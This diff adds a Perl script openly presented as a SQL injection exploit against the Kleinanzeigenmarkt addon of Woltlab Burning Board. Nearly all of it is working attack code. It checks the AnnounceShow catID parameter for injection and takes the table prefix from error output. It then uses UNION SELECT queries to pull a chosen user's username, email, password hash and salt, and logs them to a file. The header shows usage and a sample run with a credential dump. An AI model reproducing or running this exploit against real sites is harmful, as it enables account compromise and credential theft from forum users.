@@ -1,0 +1,111 @@
+#!/usr/bin/perl -w
+############################################################################
+#
+# Woltlab Burningboard Addon Kleinanzeigenmarkt SQL Injection Exploit
+# Exploit by fred777 (full np stuff <3)
+#
+# Greez to all teh l33t sh1t like :
+# * Core.am
+# * Back2hack.cc
+# * Free-hack.com
+# * fred777.de
+# 
+# Usage: exploit.pl <page> <userid>
+# Example: perl exploit.pl http://seite.de 1
+#
+###########################################################################
+#
+# Demonstration:
+#
+# perl exploit.pl http://seite.de 1
+# ...
+# >-------Exploit Intro-------<
+# -----------------------------
+# Logging:
+# -----------------------------
+# [*] Vulnerable: Yes
+# [*] Injecting..
+# [*] -----------
+# [*] Prefix: wcf1_
+# [*] mySQL Version: 5.0
+# [*] -----------
+# [*] Userid: 1
+# [*] Username: fred777
+# [*] Email: nebelfrost77@googlemail.com
+# [*] Hash: fc4520d254498762e8c576917ee452dbebd83367
+# [*] Salt: ab520eaa88d03b1d3440277c8fba78bfb1994af2
+# [*] Exit
+#
+#
+############################################################################
+# Setting crappy vars
+    use LWP::Simple;
+    if (!$ARGV[1]) {&intro; exit;}
+    my $link = shift;
+    my $userid = shift;
+    my $add = '/index.php?page=AnnounceShow&catID=';
+    
+    &intro();
+    print "\nLOGGING:\n----------------------------------------\n";
+    
+#*********** Vulnerable-Check ************#
+    $resp = get($link.$add."'");
+    if($resp =~ m/Fatal Error/i) {
+        print "[*] Vulnerable: Yes\n[*] Injecting..\n[*] --------------\n";
+    }
+    elsif($resp =~ m/SecuritySystem/i) {print "[*] Blocked by SecuritySystem\n[*] Exit\n\n"; exit;}
+    elsif($resp =~ m/id="errorMessage">/i) {print "[*] You must be a member\n[*] Exit\n\n"; exit;}    
+    else { print "[*] Vulnerable: No\n[*] Exit"; exit;}
+    
+#************* Prefix Check ***************#
+    $resp =~ m/AS wieviele FROM (.*_)attachment/i;
+    $prefix = $1;
+    print "[*] Prefix: ".$prefix."\n";
+    
+#*********** Injecting Nanobots ***********#
+    $infostring = 'concat_ws(0x3a,999999,version(),username,email,password)';
+    $resp2 = get($link.$add."1+and+1=0+GROUP+BY+b.messageID)+union+(select+1,1,1,".$infostring.",1"x38 ."+from+".$prefix."user+where+userid=".$userid.")--");
+    $resp2 =~ m/999999:(.*)<\/a>/i;
+    
+#*********** Converting and printing ******#
+    @data = split(":",$1);
+    print "[*] mySQL Version: ".substr($data[0],0,3)."\n[*] --------------\n";
+    print "[*] Userid: ".$userid."\n[*] Username: ".$data[1]."\n[*] Email: ".$data[2]."\n";
+    print "[*] Hash: ".$data[3]."\n";
+
+#************* Salt Check ***************#
+    print "[*] Salt: ";
+    $resp3 = get($link.$add."1+and+1=0+GROUP+BY+b.messageID)+union+(select+1,1,1,concat(999999,0x3a,salt)".",1"x38 ."+from+".$prefix."user+where+userid=".$userid.")--");
+    if($resp3 =~ m/Fatal Error/i) {print "Keinen\n\n\n"; exit;}
+    $resp3 =~ m/999999:(.*)<\/a>/i;
+    $salt = $1;
+    print $salt;
+
+#*********** Write2file *****************#
+    $text = "[fred777] WBB Kleinanzeigenmarkt Exploit:\n\n[*] Link: ".$link.$add."\n".
+            "[*] Prefix: ".$prefix."\n[*] mySQL Version: ".$data[0]."\n[*] Userid: ".$userid."\n".
+            "[*] Username: ".$data[1]."\n[*] Email: ".$data[2]."\n[*] Hash: ".$data[3]."\n[*] Salt: ".$salt."\n\n\n";
+    open(LULZ,">>log.txt");
+    print LULZ $text;
+    close LULZ;
+    print "\n[*] Writing Logfile";
+    print "\n[*] Exit\n\n\n";
+    
+sub intro {
+print q {
+
+---------------------------------------
+***************************************
+*
+*  [WBB] Kleinanzeigenmarkt Exploit
+*         written by fred777
+*           -----------
+*   Usage: exploit.pl <url> <userid> 
+*
+***************************************
+---------------------------------------
+};
+
+
+
+}
